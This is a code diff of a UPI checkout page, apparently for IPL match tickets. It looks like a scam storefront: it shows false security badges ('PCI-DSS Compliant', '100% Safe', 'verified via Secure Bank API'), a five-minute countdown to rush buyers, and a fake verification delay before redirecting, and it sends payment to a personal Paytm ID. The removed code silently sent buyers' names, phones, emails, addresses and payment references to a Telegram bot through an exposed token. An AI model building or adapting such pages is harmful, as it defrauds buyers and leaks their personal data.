@@ -14,14 +14,12 @@
     t.src=v;s=b.getElementsByTagName(e)[0];
     s.parentNode.insertBefore(t,s)}(window, document,'script',
     'https://connect.facebook.net/en_US/fbevents.js');
-
     fbq('init', '1252040857081560');
     fbq('track', 'PageView');
     fbq('track', 'AddPaymentInfo'); 
     </script>
     <noscript>
-        <img height="1" width="1" style="display:none"
-        src="https://www.facebook.com/tr?id=1252040857081560&ev=PageView&noscript=1"/>
+        <img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=1252040857081560&ev=PageView&noscript=1"/>
     </noscript>
 
     <style>
@@ -47,347 +45,232 @@
         .summary-toggle span#arrow { transition: transform 0.3s ease; }
         .summary-details { display: none; background: #f8fafc; padding: 15px 20px; border-bottom: 1px solid #e2e8f0; text-align: left; font-size: 13px; color: #334155; }
         .s-row { display: flex; justify-content: space-between; margin-bottom: 8px; }
-        .s-row:last-child { margin-bottom: 0; }
         .s-total { font-weight: 700; color: #0f172a; padding-top: 8px; margin-top: 8px; border-top: 1px dashed #cbd5e1; }
 
         /* Step Instructions */
         .steps-box { padding: 20px 20px 10px; text-align: left; font-size: 13px; color: #475569; line-height: 1.5; }
         .steps-box span { font-weight: 700; color: #0052FF; background: #eff6ff; padding: 2px 6px; border-radius: 4px; font-size: 11px; margin-right: 4px; }
 
+        /* Direct App Links Section */
+        .app-links-container { display: flex; justify-content: center; gap: 25px; margin-top: 20px; padding-top: 20px; border-top: 1px dashed #e2e8f0; }
+        .app-link-btn { display: flex; flex-direction: column; align-items: center; gap: 8px; text-decoration: none; transition: 0.2s; }
+        .app-link-btn:hover { transform: translateY(-3px); }
+        .app-link-btn img { width: 50px; height: 50px; object-fit: contain; background: #fff; padding: 5px; border-radius: 12px; box-shadow: 0 4px 10px rgba(0,0,0,0.05); border: 1px solid #e2e8f0;}
+        .app-link-btn span { font-size: 13px; color: #334155; font-weight: 600; }
+
         /* QR Section */
-        .qr-section { padding: 15px 20px 25px; }
-        
-        .qr-container { position: relative; width: 220px; height: 220px; margin: 0 auto; border-radius: 16px; border: 2px solid #e2e8f0; padding: 10px; background: #fff; box-shadow: 0 10px 25px rgba(0,0,0,0.05); overflow: hidden; display: none;}
-        #qr-code { width: 100%; height: 100%; object-fit: contain; border-radius: 8px; }
+        .qr-section { padding: 15px 20px 25px; background: #fafafa; }
+        .qr-container { position: relative; width: 200px; height: 200px; margin: 15px auto; border-radius: 16px; border: 2px solid #e2e8f0; padding: 10px; background: #fff; box-shadow: 0 10px 25px rgba(0,0,0,0.05); }
+        #qr-code-img { width: 100%; height: 100%; object-fit: contain; border-radius: 8px; }
+
+        .upi-box { display: inline-flex; align-items: center; justify-content: center; gap: 10px; background: #fff; padding: 10px 15px; border: 1px dashed #cbd5e1; border-radius: 8px; margin-top: 10px; box-shadow: 0 2px 5px rgba(0,0,0,0.02);}
+        .upi-box strong { font-size: 15px; color: #0f172a; }
+        .copy-btn { background: #eff6ff; color: #0052FF; border: 1px solid #bfdbfe; padding: 6px 12px; border-radius: 6px; font-size: 12px; font-weight: 700; cursor: pointer; transition: 0.2s; }
+        .copy-btn:hover { background: #0052FF; color: #fff; }
+
+        /* Confirm Button */
+        .pay-now-btn { width: 100%; padding: 18px; background: #00cf7f; color: #fff; border: none; border-radius: 12px; font-weight: 700; font-size: 16px; cursor: pointer; transition: all 0.3s ease; display: flex; justify-content: center; align-items: center; gap: 10px; margin-top: 25px; box-shadow: 0 8px 20px rgba(0, 207, 127, 0.3);}
+        .pay-now-btn:hover { transform: translateY(-2px); box-shadow: 0 10px 25px rgba(0, 207, 127, 0.4); }
+        .pay-now-btn.loading { background: #0052FF; cursor: wait; pointer-events: none; }
+        .btn-loader { border: 3px solid rgba(255,255,255,0.3); border-top: 3px solid #fff; border-radius: 50%; width: 18px; height: 18px; animation: spin 1s linear infinite; display: none; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
         /* Trust Logos */
-        .trust-logos { margin-top: 20px; display: flex; justify-content: center; align-items: center; gap: 18px; }
+        .trust-logos { margin-top: 25px; display: flex; justify-content: center; align-items: center; gap: 18px; }
         .trust-logos img { height: 20px; filter: grayscale(100%); opacity: 0.5; transition: 0.3s; }
         .trust-logos img:hover { filter: grayscale(0%); opacity: 1; }
 
-        /* Floating Label UTR Box */
-        .utr-box { padding: 25px 20px; background: #fff; text-align: left; border-top: 1px solid #f1f5f9; position: relative; }
-        
-        .floating-group { position: relative; margin-bottom: 15px; }
-        .floating-input { width: 100%; padding: 20px 15px 10px; border: 2px solid #e2e8f0; border-radius: 12px; font-size: 16px; outline: none; box-sizing: border-box; transition: 0.3s; font-weight: 700; letter-spacing: 2px; color: #0f172a; background: #fafafa; }
-        .floating-label { position: absolute; top: 16px; left: 16px; color: #64748b; font-size: 15px; transition: 0.3s; pointer-events: none; font-weight: 500;}
-        
-        .floating-input:focus, .floating-input:not(:placeholder-shown) { border-color: #0052FF; background: #fff; box-shadow: 0 0 0 4px rgba(0, 82, 255, 0.1); }
-        .floating-input:focus ~ .floating-label, .floating-input:not(:placeholder-shown) ~ .floating-label { top: 6px; font-size: 11px; color: #0052FF; font-weight: 700; letter-spacing: 0.5px; }
-        
-        .error-msg { color: #ef4444; font-size: 12px; margin-top: 8px; margin-bottom: 10px; display: none; font-weight: 600; align-items: center; gap: 5px;}
-
-        /* Modern Pay Button */
-        .pay-now-btn { width: 100%; padding: 18px; background: #cbd5e1; color: #fff; border: none; border-radius: 12px; font-weight: 700; font-size: 16px; cursor: not-allowed; transition: all 0.3s ease; display: flex; justify-content: center; align-items: center; gap: 10px; margin-top: 10px;}
-        .pay-now-btn.active { background: #00cf7f; cursor: pointer; box-shadow: 0 8px 20px rgba(0, 207, 127, 0.3); }
-        .pay-now-btn.active:hover { transform: translateY(-2px); box-shadow: 0 10px 25px rgba(0, 207, 127, 0.4); }
-        .pay-now-btn.loading { background: #0052FF; cursor: wait; pointer-events: none; }
-
-        /* Loader inside button */
-        .btn-loader { border: 3px solid rgba(255,255,255,0.3); border-top: 3px solid #fff; border-radius: 50%; width: 18px; height: 18px; animation: spin 1s linear infinite; display: none; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        
-        .strict-warning { font-size: 11px; color: #64748b; text-align: center; margin-top: 16px; font-weight: 500; background: #f8fafc; padding: 10px; border-radius: 8px; border: 1px solid #e2e8f0; }
-
-        /* Security Badges */
-        .secured-by { margin-top: 25px; display: flex; justify-content: center; gap: 20px; font-size: 12px; color: #94a3b8; font-weight: 600; }
+        .secured-by { margin-top: 25px; margin-bottom: 20px; display: flex; justify-content: center; gap: 20px; font-size: 12px; color: #94a3b8; font-weight: 600; }
         .secured-by div { display: flex; align-items: center; gap: 6px; }
     </style>
 </head>
 <body>
 
-    <div class="timer-banner">
-        <svg fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm1-12a1 1 0 10-2 0v4a1 1 0 00.293.707l2.828 2.829a1 1 0 101.415-1.415L11 9.586V6z" clip-rule="evenodd"></path></svg>
-        Complete payment in <span id="timer">05:00</span> minutes
+<div class="timer-banner">
+    <svg fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M10 18a8 8 0 100-16 8 8 0 000 16zm1-12a1 1 0 10-2 0v4a1 1 0 00.293.707l2.828 2.829a1 1 0 101.415-1.415L11 9.586V6z" clip-rule="evenodd"></path></svg>
+    Complete payment in <span id="timer">05:00</span> minutes
+</div>
+
+<div class="checkout-box">
+    <div class="checkout-header">
+        <span class="title">
+            <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
+            SECURE PAY
+        </span>
+        <span id="p-amt" class="amount">₹0</span>
     </div>
 
-    <div class="checkout-box">
-        <div class="checkout-header">
-            <span class="title">
-                <svg width="18" height="18" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" viewBox="0 0 24 24"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
-                SECURE PAY
-            </span>
-            <span id="p-amt" class="amount">₹0</span>
-        </div>
+    <div class="summary-toggle" onclick="toggleSummary()">
+        <span>View Order Summary</span>
+        <span id="arrow">▼</span>
+    </div>
+    <div class="summary-details" id="summary-details">
+        <div class="s-row"><span>Item:</span><span id="s-match">Loading...</span></div>
+        <div class="s-row"><span>Platform Fee:</span><span style="color:#00cf7f; font-weight:600;">₹0 (Waived)</span></div>
+        <div class="s-row s-total"><span>Total Payable:</span><span id="s-total">₹0</span></div>
+    </div>
 
-        <div class="summary-toggle" onclick="toggleSummary()">
-            <span>View Order Summary</span>
-            <span id="arrow">▼</span>
-        </div>
-        <div class="summary-details" id="summary-details">
-            <div class="s-row"><span>Match:</span><span id="s-match">Loading...</span></div>
-            <div class="s-row"><span>Platform Fee:</span><span style="color:#00cf7f; font-weight:600;">₹0 (Waived)</span></div>
-            <div class="s-row s-total"><span>Total Payable:</span><span id="s-total">₹0</span></div>
-        </div>
-
-        <div class="steps-box">
-            <div style="margin-bottom: 8px;"><span>Step 1</span> Scan QR code using any UPI App.</div>
-            <div><span>Step 2</span> Pay the exact amount & copy Bank UTR.</div>
-        </div>
+    <div class="steps-box">
+        <div style="margin-bottom: 8px;"><span>Step 1</span> Click PhonePe/Paytm button or Scan QR.</div>
+        <div><span>Step 2</span> Make the payment securely via App.</div>
+    </div>
+    
+    <div class="qr-section">
+        <p style="color:#64748b; font-size:14px; margin-top:0; font-weight:600;">Amount to pay: <span id="final_paid_price" style="color:#00cf7f; font-weight: 800; font-size: 16px;">₹0</span></p>
         
-        <div class="qr-section">
-            <p style="color:#64748b; font-size:13px; margin-top:0; font-weight:500;" id="qr-msg">Connecting to Secure Server...</p>
-            
-            <div class="qr-container" id="qr-wrapper">
-                <img id="qr-code" src="" alt="UPI QR">
-            </div>
-
-            <div id="upi-display-section" style="display: none; margin-top: 15px; text-align: center;">
-                <p style="font-size: 13px; color: #475569; margin-bottom: 8px; font-weight: 500;">Or Pay directly to UPI ID:</p>
-                <div style="display: inline-flex; align-items: center; justify-content: center; gap: 10px; background: #f8fafc; padding: 8px 15px; border: 1px dashed #cbd5e1; border-radius: 8px;">
-                    <strong id="visible-upi-text" style="font-size: 15px; color: #0f172a;"></strong>
-                    <button onclick="copyUPI()" style="background: #0052FF; color: white; border: none; padding: 6px 14px; border-radius: 4px; font-size: 12px; font-weight: 700; cursor: pointer; transition: 0.2s;">COPY</button>
-                </div>
-                <p id="upi-copied-msg" style="display:none; color:#00cf7f; font-size:12px; margin-top:8px; font-weight:700;">✅ Copied!</p>
-            </div>
-
-            <div class="trust-logos">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/e/e1/UPI-Logo-vector.svg" alt="UPI" height="18">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/f/f2/Google_Pay_Logo.svg" alt="GPay">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/7/71/PhonePe_Logo.svg" alt="PhonePe">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/2/24/Paytm_Logo_%28standalone%29.svg" alt="Paytm">
-            </div>
+        <div class="qr-container" id="qr-wrapper">
+            <img id="qr-code-img" src="" alt="UPI QR Code">
         </div>
 
-        <div class="utr-box">
-            <div class="floating-group">
-                <input type="number" id="utr" class="floating-input" placeholder=" " oninput="checkInputs()">
-                <label class="floating-label">Enter Bank UTR / Reference No.</label>
-            </div>
-            
-            <div id="utr-error" class="error-msg">
-                <svg width="14" height="14" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z" clip-rule="evenodd"></path></svg>
-                Invalid Bank UTR! Please check again.
-            </div>
+        <p style="font-size: 13px; color: #475569; margin-bottom: 5px; font-weight: 500;">Or Pay to UPI ID:</p>
+        <div class="upi-box">
+            <input type="hidden" id="upiID" value="">
+            <strong id="upi-text">Loading...</strong>
+            <button onclick="copyUPI()" class="copy-btn" id="copy-btn-text">COPY</button>
+        </div>
 
-            <div class="floating-group">
-                <input type="number" id="paid-amt" class="floating-input" placeholder=" " oninput="checkInputs()">
-                <label class="floating-label">Enter Exact Amount Paid (₹)</label>
-            </div>
+        <div class="app-links-container">
+            <a id="phonepe-link" href="#" class="app-link-btn">
+                <img alt="PhonePe" src="https://cdn.razorpay.com/app/phonepe.svg">
+                <span>PhonePe</span>
+            </a>
+            <a id="paytm-link" href="#" class="app-link-btn">
+                <img alt="Paytm" src="https://cdn.razorpay.com/app/paytm.svg">
+                <span>Paytm</span>
+            </a>
+        </div>
 
-            <div id="amt-error" class="error-msg">
-                <svg width="14" height="14" fill="currentColor" viewBox="0 0 20 20"><path fill-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z" clip-rule="evenodd"></path></svg>
-                Amount mismatch! Please enter the exact amount shown above.
-            </div>
+        <button id="pay-btn" class="pay-now-btn" onclick="submitPaymentStatus()">
+            <div class="btn-loader" id="btn-loader"></div>
+            <span id="btn-text">I HAVE PAID</span>
+        </button>
 
-            <button id="pay-btn" class="pay-now-btn" disabled onclick="submitPayment()">
-                <div class="btn-loader" id="btn-loader"></div>
-                <span id="btn-text">VERIFY PAYMENT</span>
-            </button>
-            
-            <div class="strict-warning">
-                Strictly verified via Secure Bank API. Fake verification attempts are logged automatically.
-            </div>
+        <div class="trust-logos">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/e/e1/UPI-Logo-vector.svg" alt="UPI" height="18">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/f/f2/Google_Pay_Logo.svg" alt="GPay">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/7/71/PhonePe_Logo.svg" alt="PhonePe">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/2/24/Paytm_Logo_%28standalone%29.svg" alt="Paytm">
         </div>
     </div>
+</div>
 
-    <div class="secured-by">
-        <div>🔒 256-bit SSL</div>
-        <div>✅ 100% Safe</div>
-        <div>🏦 PCI-DSS Compliant</div>
-    </div>
+<div class="secured-by">
+    <div>🔒 256-bit SSL</div>
+    <div>✅ 100% Safe</div>
+    <div>🏦 PCI-DSS Compliant</div>
+</div>
 
-    <script>
-        // --- ⏳ TIMER LOGIC ---
-        let timeLeft = 300; 
-        const timerEl = document.getElementById('timer');
-        let timerId = setInterval(() => {
-            if(timeLeft <= 0) {
-                clearInterval(timerId);
-                timerEl.innerText = "00:00";
-                return;
+<script>
+    // --- ⏳ TIMER LOGIC ---
+    let timeLeft = 300; 
+    const timerEl = document.getElementById('timer');
+    let timerId = setInterval(() => {
+        if(timeLeft <= 0) { clearInterval(timerId); timerEl.innerText = "00:00"; return; }
+        timeLeft--;
+        let m = Math.floor(timeLeft / 60).toString().padStart(2, '0');
+        let s = (timeLeft % 60).toString().padStart(2, '0');
+        timerEl.innerText = m + ':' + s;
+    }, 1000);
+
+    // --- SYSTEMATIC PRICE & PRODUCT CATCHER ---
+    
+    // 1. Pehle hum check karenge ki kya kisi ne URL ke through price bheja hai? (e.g. checkout.html?price=2500&item=VIP+Pass)
+    const urlParams = new URLSearchParams(window.location.search);
+    const urlPrice = urlParams.get('price');
+    const urlItem = urlParams.get('item');
+
+    // 2. Agar URL mein nahi hai, toh hum LocalStorage mein check karenge.
+    const localPrice = localStorage.getItem('finalPrice') || localStorage.getItem('selectedTotalPrice');
+    let localItem = "Online Order";
+    try {
+        const matchData = JSON.parse(localStorage.getItem('selectedMatch'));
+        if(matchData && matchData.title) localItem = matchData.title;
+    } catch(e){}
+
+    // 3. Final Price aur Item Name Set karna (URL ko first priority di hai)
+    const finalPrice = Number(urlPrice || localPrice || 0); // Default 0 agar kuch na mile
+    const productName = urlItem || localItem;
+
+    // --- UI UPDATE KARNA ---
+    document.getElementById('p-amt').innerText = "₹" + finalPrice;
+    document.getElementById('s-match').innerText = productName;
+    document.getElementById('s-total').innerText = "₹" + finalPrice;
+    document.getElementById('final_paid_price').innerText = "₹" + finalPrice;
+
+    function toggleSummary() {
+        const details = document.getElementById('summary-details');
+        const arrow = document.getElementById('arrow');
+        if(details.style.display === 'block') { details.style.display = 'none'; arrow.style.transform = 'rotate(0deg)'; } 
+        else { details.style.display = 'block'; arrow.style.transform = 'rotate(180deg)'; }
+    }
+
+    function copyUPI() {
+        const copyText = document.getElementById("upiID").value;
+        if(copyText) {
+            navigator.clipboard.writeText(copyText).then(() => {
+                const btn = document.getElementById('copy-btn-text');
+                btn.innerText = "COPIED!";
+                btn.style.background = "#00cf7f";
+                btn.style.color = "#fff";
+                setTimeout(() => { btn.innerText = "COPY"; btn.style.background = "#eff6ff"; btn.style.color = "#0052FF"; }, 2000);
+            }).catch(err => console.error('Failed to copy: ', err));
+        }
+    }
+
+    // --- AUTO QR & PAYMENT LINKS GENERATOR ---
+    function updateUPIUrls() {
+        let upiId = "paytm.s1h6t6g@pty"; // Yahan apni UPI ID dalein
+        let pn = "My Store";
+        let tn = "Payment for " + productName; // Payment description automatically product ke naam par banegi
+
+        document.getElementById("upiID").value = upiId;
+        document.getElementById("upi-text").innerText = upiId;
+
+        if (finalPrice > 0) {
+            // Generating URL for QR Code
+            const upiPayUrl = "upi://pay?pa=" + encodeURIComponent(upiId) + "&pn=" + encodeURIComponent(pn) + "&am=" + finalPrice + "&cu=INR&tn=" + encodeURIComponent(tn);
+            document.getElementById("qr-code-img").src = "https://api.qrserver.com/v1/create-qr-code/?size=200x200&data=" + encodeURIComponent(upiPayUrl);
+        } else {
+            document.getElementById("qr-code-img").src = "https://via.placeholder.com/200?text=Invalid+Amount";
+        }
+
+        // PhonePe Link Generation
+        const phonepePayload = {
+            contact: { cbcName: "", nickName: "", vpa: upiId, type: "VPA" },
+            p2pPaymentCheckoutParams: {
+                note: tn,
+                isByDefaultKnownContact: true,
+                initialAmount: finalPrice * 100, // PhonePe takes amount in paise
+                currency: "INR",
+                checkoutType: "DEFAULT",
+                transactionContext: "p2p"
             }
-            timeLeft--;
-            let m = Math.floor(timeLeft / 60).toString().padStart(2, '0');
-            let s = (timeLeft % 60).toString().padStart(2, '0');
-            timerEl.innerText = m + ':' + s;
-        }, 1000);
+        };
+        const phonepeBase64 = encodeURIComponent(btoa(JSON.stringify(phonepePayload)));
+        document.getElementById("phonepe-link").href = "phonepe://native?data=" + phonepeBase64 + "&id=p2ppayment";
 
-        // --- ORDER SUMMARY LOGIC ---
-        const finalPrice = localStorage.getItem('finalPrice') || 0;
-        const matchTitle = JSON.parse(localStorage.getItem('selectedMatch'))?.title || "IPL Match Ticket";
-        
-        document.getElementById('p-amt').innerText = "₹" + finalPrice;
-        document.getElementById('s-match').innerText = matchTitle;
-        document.getElementById('s-total').innerText = "₹" + finalPrice;
+        // Paytm Link Generation
+        document.getElementById("paytm-link").href = "paytmmp://cash_wallet?pa=" + encodeURIComponent(upiId) + "&pn=" + encodeURIComponent(pn) + "&am=" + finalPrice + "&cu=INR&tn=" + encodeURIComponent(tn) + "&featuretype=money_transfer";
+    }
 
-        function toggleSummary() {
-            const details = document.getElementById('summary-details');
-            const arrow = document.getElementById('arrow');
-            if(details.style.display === 'block') {
-                details.style.display = 'none';
-                arrow.style.transform = 'rotate(0deg)';
-            } else {
-                details.style.display = 'block';
-                arrow.style.transform = 'rotate(180deg)';
-            }
-        }
+    // Call instantly on page load
+    updateUPIUrls();
 
-        // --- 🔥 COPY FUNCTION 🔥 ---
-        function copyUPI() {
-            const upiText = document.getElementById('visible-upi-text').innerText;
-            if (!upiText) return;
-            navigator.clipboard.writeText(upiText).then(() => {
-                const msgEl = document.getElementById('upi-copied-msg');
-                msgEl.style.display = 'block';
-                setTimeout(() => { msgEl.style.display = 'none'; }, 2000);
-            }).catch(err => alert("Failed to copy UPI."));
-        }
+    // --- SUBMIT BUTTON ---
+    function submitPaymentStatus() {
+        const btn = document.getElementById('pay-btn');
+        const btnLoader = document.getElementById('btn-loader');
+        const btnText = document.getElementById('btn-text');
 
-        // --- NEW SECURE VALIDATION LOGIC ---
-        function checkInputs() {
-            const utrVal = document.getElementById('utr').value;
-            const amtVal = document.getElementById('paid-amt').value;
-            const btn = document.getElementById('pay-btn');
-            
-            const utrInput = document.getElementById('utr');
-            const amtInput = document.getElementById('paid-amt');
+        btn.classList.add('loading');
+        btnText.innerText = "Verifying Payment...";
+        btnLoader.style.display = "block";
 
-            // Reset errors visually
-            document.getElementById('utr-error').style.display = 'none';
-            document.getElementById('amt-error').style.display = 'none';
-            utrInput.style.borderColor = '#0052FF';
-            
-            // Only make amount box blue if user is typing
-            if(amtVal.length > 0) amtInput.style.borderColor = '#0052FF';
-            else amtInput.style.borderColor = '#e2e8f0';
-
-            // Button is enabled only if BOTH fields have data
-            if(utrVal.length > 5 && amtVal.length > 0) {
-                btn.disabled = false;
-                btn.classList.add('active');
-            } else {
-                btn.disabled = true;
-                btn.classList.remove('active');
-            }
-        }
-
-        function submitPayment() {
-            const val = document.getElementById('utr').value;
-            const enteredAmt = document.getElementById('paid-amt').value;
-            
-            const errorMsgUtr = document.getElementById('utr-error');
-            const errorMsgAmt = document.getElementById('amt-error');
-            
-            const utrInput = document.getElementById('utr');
-            const amtInput = document.getElementById('paid-amt');
-            
-            const btn = document.getElementById('pay-btn');
-            const btnLoader = document.getElementById('btn-loader');
-            const btnText = document.getElementById('btn-text');
-
-            // 🔥 1. Check if UTR is Fake
-            let isUtrFake = false;
-            if(val.length !== 12) isUtrFake = true;
-            else if(val.startsWith('0')) isUtrFake = true;
-            else if(/^(\d)\1{11}$/.test(val)) isUtrFake = true;
-            else if(val === '123456789012' || val === '098765432109' || val === '123451234512') isUtrFake = true;
-
-            // 🔥 2. Check if Amount matches Exactly
-            let isAmtFake = false;
-            if(enteredAmt != finalPrice) isAmtFake = true;
-
-            // Display Errors
-            if(isUtrFake) {
-                errorMsgUtr.style.display = 'flex';
-                utrInput.style.borderColor = '#ef4444';
-            } 
-            else if(isAmtFake) {
-                errorMsgAmt.style.display = 'flex';
-                amtInput.style.borderColor = '#ef4444';
-            } 
-            else {
-                // ALL GOOD - PROCEED!
-                errorMsgUtr.style.display = 'none';
-                errorMsgAmt.style.display = 'none';
-                localStorage.setItem('userUTR', val); 
-
-                // ⏳ FAKE API DELAY
-                btn.classList.remove('active');
-                btn.classList.add('loading');
-                btnText.innerText = "Verifying with Bank API...";
-                btnLoader.style.display = "block";
-
-                setTimeout(() => {
-                    // --- ✈️ TELEGRAM UTR ALERT ---
-                    const botToken = "8642950249:AAF8oxzhk-6NvYTEtpIW0oNNwsb2RQljliY"; 
-                    const chatId = "6820660513"; 
-                    
-                    const name = localStorage.getItem('customerName') || 'N/A';
-                    const phone = localStorage.getItem('customerPhone') || 'N/A';
-                    const email = localStorage.getItem('customerEmail') || 'N/A';
-                    const address = localStorage.getItem('customerAddress') || 'N/A';
-
-                    const telegramMsg = `💰 *PAYMENT SUBMITTED!* 💰%0A%0A` +
-                                        `🏏 *Match:* ${matchTitle}%0A` +
-                                        `💵 *System Amount:* ₹${finalPrice}%0A` +
-                                        `💸 *Entered Amount:* ₹${enteredAmt}%0A` +
-                                        `👤 *Name:* ${name}%0A` +
-                                        `📞 *Phone:* ${phone}%0A` +
-                                        `📧 *Email:* ${email}%0A` +
-                                        `🏠 *Address:* ${address}%0A%0A` +
-                                        `🏦 *Bank UTR:* ${val}`;
-
-                    const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${telegramMsg}&parse_mode=Markdown`;
-
-                    fetch(url).then(() => {
-                        window.location.href = 'processing.html'; 
-                    }).catch(() => {
-                        window.location.href = 'processing.html'; 
-                    });
-
-                }, 2500); 
-            }
-        }
-    </script>
-
-    <script type="module">
-        import { db, ref, onValue } from "./js/firebase.js";
-
-        const price = localStorage.getItem('finalPrice') || 0;
-        const qrImg = document.getElementById('qr-code');
-        const qrMsg = document.getElementById('qr-msg');
-        const qrWrapper = document.getElementById('qr-wrapper');
-
-        try {
-            onValue(ref(db, 'settings/payment'), (snap) => {
-                if (snap.exists()) {
-                    const data = snap.val();
-                    let url = data.qrUrl || "";
-                    let upi = data.upiId || "";
-
-                    if (url.startsWith("qhttp")) { url = url.replace("qhttp", "http"); }
-                    
-                    // Safely showing the UPI ID in the new box if it exists
-                    if (upi !== "") {
-                        document.getElementById('visible-upi-text').innerText = upi;
-                        document.getElementById('upi-display-section').style.display = 'block';
-                    }
-
-                    if (url !== "") {
-                        qrImg.src = url;
-                        qrMsg.style.display = 'none'; 
-                        qrWrapper.style.display = 'block';
-                    } 
-                    else if (upi !== "") {
-                        const upiString = `upi://pay?pa=${upi}&pn=SecurePayment&am=${price}&cu=INR`;
-                        qrImg.src = `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(upiString)}`;
-                        qrMsg.style.display = 'none'; 
-                        qrWrapper.style.display = 'block';
-                    } else {
-                        qrMsg.innerText = "Payment method not available at the moment.";
-                    }
-                } else {
-                    qrMsg.innerText = "QR Setup is incomplete. Check Admin Panel.";
-                }
-            }, (error) => {
-                qrMsg.innerText = "Connection Error: " + error.message;
-            });
-        } catch (err) {
-            qrMsg.innerText = "System Error: " + err.message;
-        }
-    </script>
+        setTimeout(() => {
+            window.location.href = 'processing.html'; 
+        }, 2500);
+    }
+</script>
 
 </body>
 </html>
-
